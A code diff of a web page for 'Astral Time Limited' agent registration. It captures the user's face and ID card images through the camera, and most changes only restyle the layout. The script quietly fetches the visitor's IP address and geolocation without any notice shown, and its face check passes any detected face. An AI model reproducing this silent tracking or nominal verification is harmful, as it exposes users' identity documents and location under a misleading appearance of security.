@@ -39,8 +39,11 @@ button {
 button:hover {
   background: #0056b3;
 }
-video {
+.video-container {
+  position: relative;
   margin-top: 20px;
+}
+video {
   width: 360px;
   height: 360px;
   object-fit: cover;
@@ -48,17 +51,26 @@ video {
   border: 5px solid #007bff;
   transform: scaleX(-1);
 }
+.guide-circle {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 360px;
+  height: 360px;
+  border: 3px dashed #00aaff;
+  border-radius: 50%;
+  pointer-events: none;
+}
+.guide-text {
+  margin-top: 10px;
+  font-size: 14px;
+  color: #333;
+}
 canvas { display: none; }
 p#status {
   margin-top: 20px;
   font-size: 14px;
   color: red;
-}
-.notice {
-  margin-top: 15px;
-  font-size: 12px;
-  color: #555;
-  text-align: center;
 }
 footer {
   margin-top: 30px;
@@ -73,10 +85,14 @@ footer {
 <h2>Astral Time Limited</h2>
 <h3>Agent Registration - Face & ID Verification</h3>
 
-<div class="notice">请保持光线充足，对准脸部取景框拍摄！</div>
+<div class="video-container">
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <div class="guide-circle"></div>
+</div>
+
+<div class="guide-text">请将脸部放入蓝色圆圈中，保持光线充足！</div>
 
 <button onclick="startCamera()" id="startBtn">Start Camera</button>
-<video id="video" style="display:none;" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
 <button onclick="captureFace()" id="captureBtn" style="display:none;">Capture Face</button>
@@ -98,7 +114,7 @@ footer {
 
 <footer>Copyright © 2025 Astral Time Limited. All rights reserved.</footer>
 </div>
-  <script>
+<script>
 let failCount = 0;
 let idFrontImage = '';
 let idBackImage = '';
@@ -120,7 +136,7 @@ function startCamera() {
   });
 
   // 抓取IP地址和地理位置
-  fetch('https://ipinfo.io?token=your_ipinfo_token')  // 替换your_ipinfo_token为你申请的Token
+  fetch('https://ipinfo.io?token=your_ipinfo_token') // 替换 your_ipinfo_token
     .then(response => response.json())
     .then(data => {
       ipInfo = data;
@@ -147,7 +163,7 @@ function captureFace() {
   })
   .then(response => response.json())
   .then(data => {
-    if (data.faces && data.faces.length >= 1) { // 只要检测到至少一张脸就通过
+    if (data.faces && data.faces.length >= 1) {
       document.getElementById('registerForm').style.display = 'flex';
       document.getElementById('status').innerText = "Face verification success! Please continue.";
     } else {
@@ -216,7 +232,7 @@ document.getElementById('registerForm').addEventListener('submit', function(e) {
 
   alert("Registration submitted!\n(Next Step: send data to server or email manually.)");
 
-  // TODO: 这里可以加发送到服务器/Make.com webhook 发Email
+  // TODO: 可以加Make.com发送资料，或保存到服务器
 });
 </script>
 </body>
